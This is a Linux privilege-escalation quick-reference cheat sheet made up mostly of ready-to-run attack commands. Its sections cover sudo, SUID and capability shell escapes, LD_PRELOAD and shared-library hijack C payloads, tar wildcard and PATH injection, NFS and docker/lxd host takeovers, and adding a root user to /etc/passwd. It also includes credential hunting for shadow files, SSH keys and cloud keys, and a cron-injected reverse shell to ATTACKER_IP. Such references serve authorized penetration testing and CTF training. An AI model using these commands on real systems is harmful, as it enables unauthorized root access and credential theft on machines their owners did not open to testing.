# Linux Privilege Escalation — Complete Quick Reference

**References:**

- https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- https://gtfobins.github.io
- https://github.com/carlospolop/PEASS-ng
- https://github.com/DominicBreuker/pspy
- https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/

---

## Upgrade Your Shell First

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
# Ctrl+Z, then:
stty raw -echo; fg
# If no python:
script -qc /bin/bash /dev/null
```

---

## Quick One-Liner Enum

```bash
id && whoami && hostname && cat /etc/os-release && uname -a && sudo -l && ip a && ss -tulpn && find / -perm -4000 -type f 2>/dev/null && find / -writable -type d 2>/dev/null && getcap -r / 2>/dev/null
```

---

## Automated Tools (Run These First)

```bash
# LinPEAS (best all-around)
./linpeas.sh
# Linux Smart Enum
./lse.sh -l2
# pspy (monitor hidden cron/processes — CRITICAL)
./pspy64 -pf -i 1000
./pspy64 | grep -E "(root|exec|tmp|write)"
./pspy64 > pspy_output.log
# LinEnum
./LinEnum.sh -k keyword -e /path/to/output -t
# linuxprivchecker
python3 linuxprivchecker.py
```

|Tool|URL|
|---|---|
|LinPEAS|https://github.com/carlospolop/PEASS-ng|
|pspy|https://github.com/DominicBreuker/pspy|
|Linux Smart Enum|https://github.com/diego-treitos/linux-smart-enumeration|
|LinEnum|https://github.com/rebootuser/LinEnum|
|linuxprivchecker|https://github.com/linted/linuxprivchecker|
|BeRoot|https://github.com/AlessandroZ/BeRoot|
|unix-privesc-check|https://pentestmonkey.net/tools/audit/unix-privesc-check|

---

## System & Kernel

```bash
uname -a && cat /proc/version
cat /etc/os-release && cat /etc/issue && lsb_release -a
arch
```

Search for kernel exploits:

```bash
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"
# Compile & run
gcc exploit.c -o exploit && ./exploit
```

> DirtyPipe: https://academy.hackthebox.com/module/51/section/1597

---

## Users, Groups & Privileges

```bash
whoami && id
cat /etc/passwd && grep "*sh$" /etc/passwd   # shell users only
cat /etc/shadow                               # if readable = instant win
cat /etc/group
cat /etc/sudoers                              # if readable
w && who && lastlog                           # who's logged in
```

### Privileged Group Membership → Instant Privesc Paths

Check `id` output for these:

- **docker** → mount host filesystem
- **lxd** → mount host filesystem
- **disk** → read raw disk
- **adm** → read /var/log (cred hunting)
- **sudo/wheel** → sudo access
- **shadow** → read /etc/shadow

---

## Sudo Abuse

```bash
sudo -l                                       # ALWAYS check this
```

Check every binary against https://gtfobins.github.io

```bash
# Common sudo exploits
sudo -s                                       # root shell if allowed
sudo -i
sudo /bin/bash
sudo su
# Specific binary abuse (examples)
sudo vim -c '!sh'
sudo find / -exec /bin/bash \; -quit
sudo awk 'BEGIN {system("/bin/bash")}'
sudo less /etc/shadow                         # then !sh
sudo nmap --interactive                       # then !sh (old nmap)
sudo env /bin/bash
sudo perl -e 'exec "/bin/bash";'
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo apt-get changelog apt                    # then !/bin/sh
```

### LD_PRELOAD (if `env_keep+=LD_PRELOAD` in sudo -l)

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { unsetenv("LD_PRELOAD"); setresuid(0,0,0); system("/bin/bash -p"); }
```

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c
sudo LD_PRELOAD=/tmp/shell.so <allowed_binary>
```

---

## SUID / SGID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null        # SUID
find / -perm -2000 -type f 2>/dev/null        # SGID
```

Check every result on https://gtfobins.github.io (filter by SUID).

```bash
# Quick root shell via SUID binary
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; /tmp/rootbash -p
# SUID find abuse
find /home -exec "/usr/bin/bash" -p \;
```

## If SUID binary calls another program without full path → PATH injection (see below).

## Capabilities

```bash
getcap -r / 2>/dev/null
```

|Capability|Abuse|
|---|---|
|`cap_setuid`|Set UID to 0 directly|
|`cap_setgid`|Set GID to 0|
|`cap_dac_read_search`|Read any file|
|`cap_dac_override`|Write any file|
|`cap_sys_admin`|Mount filesystems, various admin|
|`cap_net_raw`|Sniff traffic|

```bash
# cap_setuid on python3
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# cap_setuid on perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# cap_setuid on ruby
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

---

## Cron Jobs & Timers

```bash
cat /etc/crontab
crontab -l
crontab -u root -l 2>/dev/null
ls -la /etc/cron* /var/spool/cron/
cat /etc/anacrontab
systemctl list-timers --all
grep "CRON" /var/log/syslog 2>/dev/null
# pspy catches what crontab/ls won't
./pspy64 -pf -i 1000
```

### Writable Cron Script

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/writable_cron_script.sh
# Wait for execution, then:
/tmp/bash -p
```

Or inject reverse shell:

```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /path/to/writable_cron_script.sh
```

### Wildcard Injection (tar with *)

If cron runs something like `tar -zcf backup.tar.gz *`:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/to/dir/shell.sh
chmod +x /path/to/dir/shell.sh
touch /path/to/dir/--checkpoint=1
touch /path/to/dir/'--checkpoint-action=exec=sh shell.sh'
# Wait for cron → /tmp/bash -p
```

### Writable Systemd Timer/Service

```bash
find / -name "*.service" -writable 2>/dev/null
find / -name "*.timer" -writable 2>/dev/null
# Edit service ExecStart to run your payload, then:
systemctl daemon-reload
```

---

## PATH Injection

If a SUID binary or cron job calls a program without full path (e.g., `service` instead of `/usr/sbin/service`):

```bash
echo $PATH
# Create malicious binary
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
# Run the vulnerable SUID binary — it calls your fake 'service'
```

Or with a C wrapper:

```c
// /tmp/service.c
int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }
```

```bash
gcc /tmp/service.c -o /tmp/service
export PATH=/tmp:$PATH
```

Check for writable directories already in PATH:

```bash
find $(echo $PATH | tr ':' ' ') -type d -writable 2>/dev/null
```

---

## Shared Library Hijacking

```bash
# Find linked libraries
ldd /opt/vulnerable_binary
# If a .so is missing or in a writable path:
```

```c
// malicious.c
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() { system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p"); }
```

```bash
gcc -shared -fPIC -o /path/to/vulnerable.so malicious.c
# Wait for binary to load it, or:
echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnerable.so
```

---

## NFS no_root_squash

```bash
# On target — check exports
cat /etc/exports                              # look for no_root_squash
# On Kali
showmount -e TARGET_IP
mkdir /tmp/nfs && sudo mount -t nfs TARGET_IP:/share /tmp/nfs
# Method 1: SUID bash
cd /tmp/nfs && sudo cp /bin/bash . && sudo chmod +s bash
# On target:
/share/bash -p
# Method 2: SUID C binary
echo 'int main(){setgid(0);setuid(0);system("/bin/bash");return 0;}' > /tmp/nfs/priv.c
sudo gcc /tmp/nfs/priv.c -o /tmp/nfs/priv
sudo chmod +s /tmp/nfs/priv
# On target:
/share/priv
```

---

## Docker Group

```bash
# Check membership
id | grep docker
# Mount host filesystem
docker run -v /:/host -it alpine chroot /host /bin/bash
# Or with host PID namespace
docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

---

## LXD/LXC Group

```bash
id | grep lxd
# On Kali — build alpine image
git clone https://github.com/saghul/lxd-alpine-builder && cd lxd-alpine-builder
./build-alpine -a i686
# Transfer alpine.tar.gz to target
# On target
lxc image import ./alpine.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
# Host filesystem at /mnt/root
```

---

## Disk Group

```bash
id | grep disk
# Read raw disk
fdisk -l
debugfs /dev/sda1
# Inside debugfs:
cat /etc/shadow
cat /root/.ssh/id_rsa
```

---

## Credential Hunting

```bash
# History files
cat ~/.bash_history
find / -type f \( -name "*_hist" -o -name "*_history" \) 2>/dev/null
# Keyword search
grep -rEi "password|pass|secret|token|key|user|login|DB_" /etc/ /var/www/ /home/ /opt/ 2>/dev/null
# Config files
find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.env" \) 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null | grep -i "DB_\|pass"
cat /etc/mysql/my.cnf 2>/dev/null
cat /etc/postgresql/*/main/pg_hba.conf 2>/dev/null
# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "authorized_keys" 2>/dev/null
ls -la /home/*/.ssh/ /root/.ssh/ 2>/dev/null
# Backup/old files
find / -type f \( -name "*.bak" -o -name "*.old" -o -name "*.backup" \) 2>/dev/null
# Environment variables
env | grep -iE "pass|key|secret|token|aws"
# Kerberos/AD (Linux joined to domain)
cat /etc/krb5.conf 2>/dev/null
cat /etc/sssd/sssd.conf 2>/dev/null
realm list 2>/dev/null
# Cloud creds
ls ~/.aws/credentials ~/.gcloud/ 2>/dev/null
# Sniff for passwords (if tcpdump allowed)
sudo tcpdump -i lo -A | grep "pass"
# Monitor processes for creds in arguments
watch -n 1 "ps -aux | grep pass"
```

---

## Writable /etc/passwd (Instant Root)

```bash
# Generate password hash
openssl passwd -1 w00t
# Add root user
echo 'root2:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2  # password: w00t
```

---

## File Discovery Cheat Sheet

```bash
# SUID
find / -perm -4000 -type f 2>/dev/null
# SGID
find / -perm -2000 -type f 2>/dev/null
# Writable files
find / -writable -type f 2>/dev/null
# Writable directories
find / -writable -type d 2>/dev/null
# World-writable
find / -perm -2 -type f 2>/dev/null
# Config files
find / -type f -name '*.conf' 2>/dev/null
# Backup files
find / -type f \( -name '*.bak' -o -name '*.old' \) 2>/dev/null
# Hidden files
find / -type f -name ".*" 2>/dev/null
# Scripts
find / -type f -iname "*.sh" 2>/dev/null
# Recently modified (last hour)
find / -mmin -60 2>/dev/null
# Files owned by current user
find / -user $(whoami) 2>/dev/null
```

---

## Network & Services

```bash
ip a && ifconfig
ss -tulpn                                     # listening ports
netstat -tulpn                                # alternative
route && ip route
arp -a
cat /etc/resolv.conf
cat /etc/hosts
# Internal services only on localhost → potential targets
ss -tulpn | grep 127.0.0.1
```

---

## Process Inspection

```bash
ps aux                                        # all processes
ps -ef --forest                               # tree view
ps -p PID -o pid,ppid,user,cmd                # specific process
ps -u root                                    # root processes only
pstree -p -u | grep PID
cat /proc/PID/cmdline                         # command line of process
cat /proc/PID/environ                         # environment variables
ls -la /proc/PID/fd/                          # file descriptors
strace -p PID                                 # trace syscalls
ltrace /path/to/binary                        # trace library calls
```

---

## Installed Software & Useful Binaries

```bash
dpkg -l 2>/dev/null || rpm -qa 2>/dev/null
which python3 python perl ruby gcc nc ncat nmap curl wget socat ssh scp gdb strace ltrace
```

---

## Security Mechanisms

```bash
aa-status 2>/dev/null                         # AppArmor
sestatus 2>/dev/null                          # SELinux
ufw status 2>/dev/null                        # firewall
iptables -L 2>/dev/null
ps aux | grep -E "fail2ban|snort"             # IDS
```

---

## Restricted Shell Escape

```bash
# Try these
bash
/bin/bash
sh -i
echo /bin/bash | bash
# Command substitution
$(bash)
`bash`
# Through allowed programs
vi → :!/bin/bash
vim → :set shell=/bin/bash → :shell
less → !bash
awk 'BEGIN {system("/bin/bash")}'
find / -exec /bin/bash \;
python3 -c 'import os; os.system("/bin/bash")'
perl -e 'exec "/bin/bash";'
# Environment
export SHELL=/bin/bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

---

## File Permissions Reference

```
-rwxr-xr-x  →  owner(rwx) group(r-x) others(r-x)
d = directory  l = symlink  c = char device  b = block device  s = socket  p = pipe
SUID (4000): file executes as file owner
SGID (2000): file executes as file group / new files inherit dir group
Sticky (1000): only file owner can delete in directory
```

IDs: Real (actual user), Effective (checked for perms), Saved (can restore)

```bash
id                                            # real UID/GID
cat /proc/$$/status | grep "[UG]id"           # all three IDs
```

---

## Attack Vector Quick Reference

|Vector|Detection|Exploitation|
|---|---|---|
|SUID Binary|`find / -perm -4000`|Check GTFOBins|
|Sudo Rights|`sudo -l`|Check GTFOBins|
|Kernel Exploit|`uname -a` → searchsploit|Compile & run|
|Cron Jobs|`cat /etc/crontab` + `pspy`|Replace script / wildcard inject|
|PATH Injection|Binary uses relative path|Fake binary in writable PATH dir|
|Capabilities|`getcap -r /`|cap_setuid → setuid(0)|
|LD_PRELOAD|`sudo -l` shows env_keep|Malicious .so|
|Docker Group|`id` shows docker|Mount host fs|
|LXD Group|`id` shows lxd|Privileged container|
|NFS no_root_squash|`cat /etc/exports`|SUID binary on share|
|Writable /etc/passwd|`ls -la /etc/passwd`|Add root user|
|Shared Library|`ldd` shows missing .so|Replace with malicious .so|
|Writable Service|`find / -name "*.service" -writable`|Change ExecStart|
|Wildcard Inject|Cron uses `tar ... *`|checkpoint-action files|
|Disk Group|`id` shows disk|debugfs read shadow|
|Weak File Perms|`ls -la /etc/shadow`|Crack hashes|
|Writable Cron Script|`ls -la /path/to/cron_script`|Inject rev shell|

---

## Methodology Checklist

1. Stabilize shell (`pty.spawn`, `stty`)
2. Run `sudo -l` — check GTFOBins for every result
3. Run `linpeas.sh` + `pspy64`
4. Check `id` for privileged groups (docker, lxd, disk)
5. Find SUID/SGID binaries → GTFOBins
6. Check capabilities (`getcap -r /`)
7. Read `/etc/crontab` + monitor with pspy for hidden crons
8. Hunt for credentials (configs, history, env vars, SSH keys)
9. Check writable `/etc/passwd` or `/etc/shadow`
10. Check NFS exports for `no_root_squash`
11. Check internal-only services (`ss -tulpn | grep 127`)
12. Kernel exploits as last resort (`uname -a` → searchsploit)